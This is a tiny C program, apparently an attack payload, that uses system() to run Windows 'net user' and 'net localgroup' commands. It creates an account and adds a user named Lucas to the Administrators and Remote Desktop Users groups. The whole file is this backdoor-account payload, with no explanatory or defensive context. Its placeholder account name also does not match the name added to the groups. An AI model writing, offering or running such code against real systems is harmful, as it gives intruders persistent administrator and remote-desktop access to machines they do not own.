#include <stdlib.h>

int main(){
	system("net user [username] [password] /add");

	system("net localgroup Administrators Lucas /add");
	
	system("net localgroup \"Remote Desktop Users\" Lucas /add");

	return 0;
}